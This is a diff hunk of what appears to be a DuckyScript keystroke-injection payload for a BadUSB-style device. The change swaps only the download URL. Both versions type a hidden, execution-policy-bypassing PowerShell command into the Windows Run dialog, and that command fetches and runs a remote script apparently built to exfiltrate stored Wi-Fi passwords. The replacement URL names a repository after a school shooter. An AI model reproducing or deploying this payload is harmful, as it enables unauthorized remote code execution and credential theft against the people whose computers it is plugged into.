@@ -11,4 +11,4 @@ REM ###########################################################
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN  powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Exfilaration/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
+STRINGLN  powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/columbineshootr/.../refs/heads/main/W-Wifi-Passwords.ps1').Content"
